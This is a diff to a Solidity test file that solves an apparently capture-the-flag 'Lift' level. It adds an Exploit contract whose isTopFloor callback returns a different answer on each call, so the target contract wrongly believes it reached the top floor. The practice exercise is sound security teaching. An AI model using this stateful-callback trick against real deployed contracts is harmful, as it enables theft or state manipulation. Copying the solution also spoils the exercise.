@@ -16,12 +16,25 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Exploit exploit = new Exploit();
+        exploit.attack(instance);
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(instance.top(), "Solution is not solving the level");
+    }
+}
+
+contract Exploit is House {
+    uint8 floor = 0;
+
+    function attack(Lift instance) external {
+        instance.goToFloor(1);
+    }
+
+    function isTopFloor(uint256) external returns (bool) {
+        return floor++ == 1;
     }
 }
